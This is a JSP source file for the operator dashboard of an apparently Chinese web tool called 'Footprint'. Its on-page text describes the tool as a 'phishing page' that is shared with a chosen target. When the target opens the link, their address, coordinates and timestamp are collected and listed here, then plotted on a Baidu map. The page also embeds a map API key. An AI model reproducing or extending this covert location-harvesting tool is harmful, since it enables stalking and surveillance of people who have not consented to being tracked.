<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt"%>
<%
    String path = request.getContextPath();
    String basePath =
            request.getScheme() + "://" + request.getServerName() + ":" + request.getServerPort()
                    + path + "/";
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">  
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0;"/>
<base href="<%=basePath%>">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=ga2vOgjKiex14wPRkTblnAHYIB2bWrTy"></script>
<title>足迹</title>
<link rel="stylesheet" type="text/css" href="layer/mobile/need/layer.css" />
<link rel="stylesheet" type="text/css" href="css/style.css" />
<link rel="stylesheet" type="text/css" href="css/location.css" />
<link rel="stylesheet" type="text/css" href="css/locationlist.css" />
<script type="text/javascript" src="js/jquery-2.0.3.min.js"></script>
<script type="text/javascript" src="js/phone.js" ></script>
<script type="text/javascript" src="layer/mobile/layer.js"></script>
<script type="text/javascript" src="js/login.js"></script>
<script type="text/javascript" src="js/baiducount.js"></script>
</head>

<body>
<div id="scroll" style="border-color: #3cfed3;">
	<div id="toTop" class="scrollItem">分享链接</div>
</div>
<div style="display: none;">
<img src="image/zj.jpg">
</div>
<div class="whole">
<div class="zujiquan-index" onclick="fanhui();" style="font-size:60px;">☜</div>
<div class="zujiquan-index" style="width: 20%; font-size: 20px; margin-left: 41%; margin-top: -102px;">足迹圈</div>
<div class="zujiquan-index" style="float: right; margin-top: -102px; color: white;" onclick="refresh();">✽</div>
<HR style="margin-top: -30px;">
	<div class="title">Welcome to Footprint</div>
    <div class="coordinates-icon">
    	<div class="coordinates topAct">
        	<img src="image/coordinates.png" />
        </div>
        <div class="circle-1-1 circle-show-2"></div>
        <div class="circle-2-2 circle-show-1"></div>
        <div class="circle-3-3 circle-show"></div>
    </div>
    <div class="login-form" id="loginform"><!-- 登录form -->
        <div class="user-name common-div" style="height: 500px;">
            <span class="eamil-icon common-icon">
                <img src="image/dq.gif" title="全球定位展示"/>
            </span>
            <label style="">
            <br>
            点击左侧<a style="color: #3cfed3;">分享链接</a>，进入钓鱼页面（显示“🔍查找中...”），将该网页分享给你想定位的人即可，如果对方点击分享的网页了，则他的地址就会显示在下方列表里。
            </label>
            <div id="allmap" style="min-height: 100%;  width: 100%;"></div>
            <textarea rows="10" cols="50" name="comment" id="comment" style="margin: 0px; height: 179px; width: 368px; font-size: 16px;"></textarea>
        </div>
         <div class="user-name common-div" style="height: 400px;">
            <span class="eamil-icon common-icon" onclick="getlocattion()">
                <img src="image/coordinates.png" style="height: 40px;" title="定位列表"/>
            </span>
            <div style="height: 400px;  width: 100%; overflow:auto; overflow-x:hidden;">
			<table style="font-size: 12px; margin-right: 10px;" border="1px;">
			<thead>
				<tr>
					<th style="text-align: center;">位置</th>
					<th style="text-align: center;">经度</th>
					<th style="text-align: center;">纬度</th>
					<th style="text-align: center;">获取时间</th>
					<th style="text-align: center;">查看</th>
				</tr>
			</thead>
			<tbody style="">
			<c:forEach items="${ls}" var="item">
				<tr class="odd gradeX">
					<td style="text-align: center;">${item.adr }</td>
					<td style="text-align: center;">${item.lng }</td>
					<td style="text-align: center;">${item.lat }</td>
					<td style="text-align: center;">
					<fmt:parseDate value="${item.creTime }" pattern="yyyy-MM-dd HH:mm:ss" var="receiveDate"></fmt:parseDate>
          		    <fmt:formatDate value="${receiveDate}" pattern="yyyy-MM-dd HH:mm:ss" ></fmt:formatDate>
					</td>
					<td style="text-align: center;"><a href="javascript:theLocation(${item.lng }, ${item.lat }, '${item.adr }')"><img src="image/kkk.png" title="查看定位" style="width: 20px;"/></a></td>
				</tr>
			</c:forEach>
			</tbody>
		</table>
		</div>
        </div>
    </div>
</div>
<br><br>
<script type="text/javascript">
function fanhui(){
	history.go(-1);
}
function refresh(){
	window.location.href="<%=basePath%>globallocation";
}
$(function() {
	messge = '${messge}';
	if(messge != ''){
		alert(messge);
	}
	$( "#toTop").click( function () {
		window.location.href = "<%=basePath%>getfjr?mail=${mail}";
    });
});

//百度地图API功能
var map = new BMap.Map("allmap");
map.centerAndZoom(new BMap.Point(116.4,39.89),10);
map.enableScrollWheelZoom(true);

// 用经纬度设置地图中心点
function theLocation(lng, lat, adr){
	if(lng != "" && lat != ""){
		map.clearOverlays(); 
		var new_point = new BMap.Point(lng, lat);
		var marker = new BMap.Marker(new_point);  // 创建标注
		map.addOverlay(marker);              // 将标注添加到地图中
		map.panTo(new_point);  
		map.centerAndZoom(new_point, 22);
		var opts = {
		  width : 200,     // 信息窗口宽度
		  height: 100,     // 信息窗口高度
		  title : "位置定位" , // 信息窗口标题
//		  enableMessage:true,//设置允许信息窗发送短息
//		  message:""
		}
		var infoWindow = new BMap.InfoWindow("地址："+adr, opts);  // 创建信息窗口对象 
		marker.addEventListener("click", function(){          
			map.openInfoWindow(infoWindow,new_point); //开启信息窗口
		});
	}
}

</script>

</body>
</html>
